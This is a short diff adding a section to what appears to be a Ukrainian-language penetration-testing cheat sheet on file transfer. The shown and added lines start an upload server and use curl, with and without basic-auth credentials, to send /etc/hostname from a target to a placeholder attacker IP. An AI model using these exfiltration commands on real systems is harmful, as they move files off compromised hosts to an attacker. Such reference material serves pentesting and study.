@@ -240,4 +240,10 @@ pip install uploadserver & python3 -m uploadserver --basic-auth hack:russia
 curl -F "files=@/etc/hostname" http://<attacker_ip>:<port>/upload
 ```
 
+### 🔸 На таргеті з Basic Auth:
+```bash
+curl -u hack:russia -F "files=@/etc/hostname" http://<attacker_ip>:<port>/upload
+
+```
+
 ---
